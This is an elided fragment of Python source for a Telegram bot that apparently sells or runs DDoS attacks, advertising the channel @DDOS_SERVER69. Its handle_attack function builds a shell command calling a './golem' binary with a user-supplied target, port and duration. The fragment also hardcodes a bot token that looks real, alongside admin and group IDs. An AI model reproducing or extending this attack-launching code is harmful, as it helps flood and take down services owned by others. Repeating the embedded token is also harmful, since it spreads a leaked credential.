...
bot = telebot.TeleBot('7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70') #bot token dalo


# Admin user IDs
admin_id = ["1866961136"]     #admin id dalo

# Group and channel details
GROUP_ID = "-1002328886935"            #group id dalo
CHANNEL_USERNAME = "@DDOS_SERVER69"         #channel username 
...
def handle_attack(message):
    ...
    full_command = f"./golem {target} {port} {time_duration} 800"
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/DDOS_SERVER69) 🚀🔥"""
